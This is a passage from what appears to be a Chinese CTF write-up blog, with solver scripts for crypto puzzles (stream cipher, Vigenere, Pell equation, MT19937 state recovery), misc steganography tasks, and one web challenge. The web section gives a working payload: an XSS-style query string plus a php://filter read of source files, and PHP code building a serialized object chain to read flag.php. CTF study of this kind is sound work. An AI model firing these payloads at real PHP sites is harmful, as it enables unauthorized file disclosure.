  forge(w, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0xa</span>, <span class="hljs-number">0xf</span>)<br>                forge(w, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xc</span>)<br>                forge(w, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0xd</span>)<br>                forge(w, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>)<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> pack(<span class="hljs-string">&#x27;&lt;16L&#x27;</span>, *((w[_] + bring[_]) &amp; <span class="hljs-number">0xffffffff</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>))):<br>                <span class="hljs-keyword">yield</span> c<br>            bring[<span class="hljs-number">12</span>] = (bring[<span class="hljs-number">12</span>] + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xffffffff</span><br>            <span class="hljs-keyword">if</span> bring[<span class="hljs-number">12</span>] == <span class="hljs-number">0</span>:<br>                bring[<span class="hljs-number">13</span>] = (bring[<span class="hljs-number">13</span>] + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xffffffff</span><br><br>key = <span class="hljs-string">&#x27;52f0907eca3ce05d8d0b6691bb8c8dbca19b63b7bcfcf033fc320f182b5ad610&#x27;</span><br>enc = <span class="hljs-string">&#x27;6d9b546c9f1f5e7116203933dabbf25e3a0e143122b20c27e5c83ea26b9d0dbb&#x27;</span><br><br>key, enc = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">bytes</span>.fromhex, (key, enc))<br><br>key = (key * (<span class="hljs-number">32</span> // <span class="hljs-built_in">len</span>(key) + <span class="hljs-number">1</span>))[:<span class="hljs-number">32</span>]<br><br><span class="hljs-keyword">for</span> rand <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>), repeat=<span class="hljs-number">2</span>):<br>    stream = AS(key)<br>    rand = <span class="hljs-built_in">bytes</span>(rand) * <span class="hljs-number">16</span><br>    passphrase = <span class="hljs-built_in">bytes</span>(a ^ b ^ c <span class="hljs-keyword">for</span> a, b, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(enc, stream.go(), rand))<br>    msg = <span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(passphrase, key))<br>    <span class="hljs-keyword">if</span> (msg.startswith(<span class="hljs-string">b&#x27;HSNCTF&#123;&#x27;</span>)):<br>        <span class="hljs-built_in">print</span>(msg)<br>        <br><span class="hljs-comment">#HSNCTF&#123;91404a209e0f9ab7d245d5ee&#125;</span><br></code></pre></td></tr></table></figure><h2 id="brute-vigenere"><a href="#brute-vigenere" class="headerlink" title="brute_vigenere"></a>brute_vigenere</h2><p>密码表里多了一对括号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">import <span class="hljs-keyword">string</span><br>import itertools<br><br>dicts = <span class="hljs-keyword">string</span>.ascii_lowercase +<span class="hljs-string">&quot;&#123;&#125;&quot;</span><br><span class="hljs-comment">#print(dicts)</span><br><span class="hljs-comment"># key = (&#x27;&#x27;.join([random.choice(dicts) for i in range(4)])) * 8</span><br>enc = <span class="hljs-string">&#x27;&#123;mvjk&#125;gbxyiutfchpm&#125;ylm&#125;a&#125;amuxlmg&#x27;</span><br><span class="hljs-keyword">for</span> k in itertools.<span class="hljs-title function_ invoke__">product</span>(dicts,repeat=<span class="hljs-number">4</span>):<br>    key = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>(k)<br>    <span class="hljs-comment"># print(key)</span><br>    numenc = [dicts.<span class="hljs-title function_ invoke__">index</span>(i) <span class="hljs-keyword">for</span> i in enc]<br>    numkey = [dicts.<span class="hljs-title function_ invoke__">index</span>(i) <span class="hljs-keyword">for</span> i in key]<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-title function_ invoke__">len</span>(enc)):<br>        <span class="hljs-comment"># assert len(numenc) == len(numkey)</span><br>        ans = (numenc[i] - numkey[i % <span class="hljs-number">4</span>]) % <span class="hljs-number">28</span><br>        flag += dicts[ans]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hsnctf&#x27;</span> in flag:<br>        <span class="hljs-keyword">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br>            <br><span class="hljs-comment">#hsnctf&#123;wecanalwaystrustvigenere&#125;</span><br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>公众号回复签到题即可<br><code>hsnctf&#123;welcome_to_hsnctf&#125;</code></p><h2 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h2><p>根据<code>Cloakify.txt</code>名字知道是Cloakify隐写 ：<a href="https://github.com/TryCatchHCF/Cloakify">https://github.com/TryCatchHCF/Cloakify</a><br>得到一个txt文件  根据PK得知为zip文件 改后缀 发现是压缩包套娃</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> *<br><br>name = <span class="hljs-string">&#x27;f2332&#x27;</span><br>num = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    fz = zipfile.ZipFile(name + <span class="hljs-string">&#x27;.zip&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)    <span class="hljs-comment">#读取zip文件</span><br>password = name<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> fz.namelist():         <span class="hljs-comment">#遍历zip内文件名</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;zip&quot;</span> <span class="hljs-keyword">in</span> i:      <span class="hljs-comment">#判断当前文件是否是zip文件</span><br>        newpassword = i[<span class="hljs-number">0</span>:-<span class="hljs-number">4</span>]   <span class="hljs-comment">#压缩密码为zip文件名，取出</span><br><span class="hljs-built_in">print</span>(newpassword)<br><span class="hljs-comment"># fz.extractall(pwd=bytes(password, &#x27;utf-8&#x27;))       #提取zip文件</span><br>fz.extractall()<br>num +=<span class="hljs-number">1</span><br>name = newpassword<br></code></pre></td></tr></table></figure><p>解开套娃之后即可得到flag<br><code>hsnctf&#123;66eec912-e9ce-4e1d-ac54-ecea075dcb96&#125;</code></p><h2 id="外星电波"><a href="#外星电波" class="headerlink" title="外星电波~"></a>外星电波~</h2><p><img src="/mdimg/2023sswk/2.png"><br>flag.txt比flag.rar小很多怀疑有其他文件 但binwalk无果  在010发现hillstone.wav  Ntfs隐写  导出wav文件<br><img src="/mdimg/2023sswk/3.png"><br>SSTV解密<br><img src="/mdimg/2023sswk/4.png"><br>flag.txt   base64转zip文件  解压即可得到flag<br><code> hsnctf&#123;70995fb0-eb60-0787-f305-77066aeb6730&#125;</code></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Primitive-php"><a href="#Primitive-php" class="headerlink" title="Primitive php"></a>Primitive php</h2><p>参考：<a href="https://blog.csdn.net/cjdgg/article/details/115314651">https://blog.csdn.net/cjdgg/article/details/115314651</a><br>用Exception和<code>&lt;script&gt;alert(&quot;1&quot;)&lt;/script&gt;</code>绕过<br><code>payload:?class1=Exception&amp;a=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&amp;class2=Exception&amp;b=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&amp;class3=SplFileObject&amp;c=php://filter/convert.base64-encode/resource=hint.php</code><br>拿到源码构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">blue</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$b1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b1 = <span class="hljs-variable">$b1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">red</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$r1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;r1 = <span class="hljs-variable">$r1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">white</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$w</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w = <span class="hljs-variable">$w</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">color</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$c1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;c1 = <span class="hljs-variable">$c1</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">color</span>(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>);  <br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">red</span>(<span class="hljs-variable">$f</span>);<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">blue</span>(<span class="hljs-variable">$e</span>);<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">color</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">white</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">red</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><h1 id="ICS"><a href="#ICS" class="headerlink" title="ICS"></a>ICS</h1><h2 id="S7-analysis"><a href="#S7-analysis" class="headerlink" title="S7_analysis"></a>S7_analysis</h2><p><img src="/mdimg/2023sswk/5.png"><br><code>hsnctf&#123;399&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
      <tag>Crypto</tag>
      
      <tag>Reverse</tag>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HWS2023 冬令营</title>
    <link href="/2023/02/06/2023HWS/"/>
    <url>/2023/02/06/2023HWS/</url>
    
    <content type="html"><![CDATA[<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>题目信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag,a,b<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> shuffle<br> <br>D = <span class="hljs-number">0x1337</span><br><span class="hljs-keyword">assert</span> a**<span class="hljs-number">2</span> - D*b**<span class="hljs-number">2</span> == <span class="hljs-number">1</span><br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">512</span>)<br>x = (a * m + b) % p<br>y=<span class="hljs-built_in">bin</span>(x)[<span class="hljs-number">2</span>:]<br>c=[y[i:i+<span class="hljs-number">85</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(y),<span class="hljs-number">85</span>)]<br>shuffle(c)<br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(c)<br> <br><span class="hljs-comment"># p=11199186558148426014734492874345932099384932524559726349180064588241518696390926354448476750322781683505497782040786332571272422812867731614415519029276349</span><br><span class="hljs-comment"># c=[&#x27;0010101111100011101101011111111001011000100110001001000000010001111011110101110011111&#x27;, &#x27;0011010010010010110010011011001100110001100010101110001010001101110001100000111011010&#x27;, &#x27;0110101101011101110000100001000000010001110110001010000000010110010101100100101110000&#x27;, &#x27;0100111001011010000101100111100110101100011100100111011000110001111101000110110101101&#x27;, &#x27;1100100110011101010011011111000101011011010000101100011001110100101000101101111110100&#x27;, &#x27;1110111110001110000101100000000100111010110000001111010001101001100001010110101010001&#x27;]</span><br></code></pre></td></tr></table></figure><p><strong>D = 0x1337 a2 - D*b2 == 1</strong><code>为Pell方程 网站在线（[http://www.numbertheory.org/php/pell.html](http://www.numbertheory.org/php/pell.html)）解一下，得到方程a，b的最小整数解 </code>a = 1809338099956399320，b = 25797719546469589</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations<br><br>D = <span class="hljs-number">0x1337</span><br>a = [<span class="hljs-number">1809338099956399320</span>]<br>b = [<span class="hljs-number">25797719546469589</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    a, b = a + [a[-<span class="hljs-number">1</span>] * a[<span class="hljs-number">0</span>] + D * b[-<span class="hljs-number">1</span>] * b[<span class="hljs-number">0</span>]], b + [a[-<span class="hljs-number">1</span>] * b[<span class="hljs-number">0</span>] + b[-<span class="hljs-number">1</span>] * a[<span class="hljs-number">0</span>]]<br><br>p=<span class="hljs-number">11199186558148426014734492874345932099384932524559726349180064588241518696390926354448476750322781683505497782040786332571272422812867731614415519029276349</span><br>c=[<span class="hljs-string">&#x27;0010101111100011101101011111111001011000100110001001000000010001111011110101110011111&#x27;</span>, <span class="hljs-string">&#x27;0011010010010010110010011011001100110001100010101110001010001101110001100000111011010&#x27;</span>, <span class="hljs-string">&#x27;0110101101011101110000100001000000010001110110001010000000010110010101100100101110000&#x27;</span>, <span class="hljs-string">&#x27;0100111001011010000101100111100110101100011100100111011000110001111101000110110101101&#x27;</span>, <span class="hljs-string">&#x27;1100100110011101010011011111000101011011010000101100011001110100101000101101111110100&#x27;</span>, <span class="hljs-string">&#x27;1110111110001110000101100000000100111010110000001111010001101001100001010110101010001&#x27;</span>]<br>res = [<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(res), <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> res <span class="hljs-keyword">in</span> permutations(c)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    ai, bi = a[i], b[i]<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> res:<br>        m = (c - bi) * inverse(ai, p) % p<br>        flag = long_to_bytes(m)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>            <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#b&#x27;flag&#123;5b80aaa2-2bb2-0ef1-4aa0-a5a9387239d5&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Numbers-Game"><a href="#Numbers-Game" class="headerlink" title="Numbers Game"></a>Numbers Game</h2><p>题目不难，比赛的时候没搞出来很难受呜呜呜<br>MT19937还原，根据624组32bit的数据还原state之后逆推上一组state进而得到前12个32bit的随机数值。参考: <a href="https://blog.csdn.net/zippo1234/article/details/109279944">https://blog.csdn.net/zippo1234/article/details/109279944</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-comment"># right shift inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_right</span>(<span class="hljs-params">res,shift,bits=<span class="hljs-number">32</span></span>):<br>    tmp = res<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits//shift):<br>        tmp = res ^ tmp &gt;&gt; shift<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment"># right shift with mask inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_right_values</span>(<span class="hljs-params">res,shift,mask,bits=<span class="hljs-number">32</span></span>):<br>    tmp = res<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits//shift):<br>        tmp = res ^ tmp&gt;&gt;shift &amp; mask<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment"># left shift inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_left</span>(<span class="hljs-params">res,shift,bits=<span class="hljs-number">32</span></span>):<br>    tmp = res<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits//shift):<br>        tmp = res ^ tmp &lt;&lt; shift<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment"># left shift with mask inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_left_values</span>(<span class="hljs-params">res,shift,mask,bits=<span class="hljs-number">32</span></span>):<br>    tmp = res<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits//shift):<br>        tmp = res ^ tmp &lt;&lt; shift &amp; mask<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backtrace</span>(<span class="hljs-params">cur</span>):<br>    high = <span class="hljs-number">0x80000000</span><br>    low = <span class="hljs-number">0x7fffffff</span><br>    mask = <span class="hljs-number">0x9908b0df</span><br>    state = cur<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>): <span class="hljs-comment">#逆求的32bit 组数 此处需要逆求12组</span><br>        tmp = state[i+<span class="hljs-number">624</span>]^state[i+<span class="hljs-number">397</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        <span class="hljs-comment"># recover highest bit</span><br>        res = tmp&amp;high<br>        <span class="hljs-comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span><br>        tmp = state[i-<span class="hljs-number">1</span>+<span class="hljs-number">624</span>]^state[i+<span class="hljs-number">396</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        res |= (tmp)&amp;low<br>        state[i] = res<br>    <span class="hljs-keyword">return</span> state<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover_state</span>(<span class="hljs-params">out</span>):<br>    state = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> out:<br>        i = inverse_right(i,<span class="hljs-number">18</span>)<br>        i = inverse_left_values(i,<span class="hljs-number">15</span>,<span class="hljs-number">0xefc60000</span>)<br>        i = inverse_left_values(i,<span class="hljs-number">7</span>,<span class="hljs-number">0x9d2c5680</span>)<br>        i = inverse_right(i,<span class="hljs-number">11</span>)<br>        state.append(i)<br>    <span class="hljs-keyword">return</span> state<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">id</span>=[<span class="hljs-string">&#x27;d5d97afad7ef619b4badd8d2da10ee24&#x27;</span>, <span class="hljs-string">&#x27;67f4660a8335fb9f4152a9fbc44c9c77&#x27;</span>, <span class="hljs-string">&#x27;8cd43c85ebe9cc7036a37f47ccd1d1e4&#x27;</span>,<br>     <span class="hljs-string">&#x27;ee3e8c62e8b0100027589d6de82677ef&#x27;</span>, <span class="hljs-string">&#x27;463bb2f3731ad0e786302bf78da08330&#x27;</span>, <span class="hljs-string">&#x27;e245b1852a3b92734e46eb3421bd76c9&#x27;</span>,<br>     <span class="hljs-string">&#x27;0b74736786b4ab94651e3b706a548e55&#x27;</span>, <span class="hljs-string">&#x27;79cb596b28c2b4e02738f93b5bfbe0d3&#x27;</span>, <span class="hljs-string">&#x27;5a9c46837952952045564b5b395acad1&#x27;</span>,<br>     <span class="hljs-string">&#x27;d3c2d90a05d1a059fbeba4a05a608798&#x27;</span>, <span class="hljs-string">&#x27;4da0306c8ab58097d2fef9114e6fcb6d&#x27;</span>, <span class="hljs-string">&#x27;9707fabbd3c96de66917f15998ac9201&#x27;</span>,<br>     <span class="hljs-string">&#x27;9dd3e46fc930abfb523fe31e8ee8a658&#x27;</span>, <span class="hljs-string">&#x27;3716a8fd05f7388e7151d09431e61ee1&#x27;</span>, <span 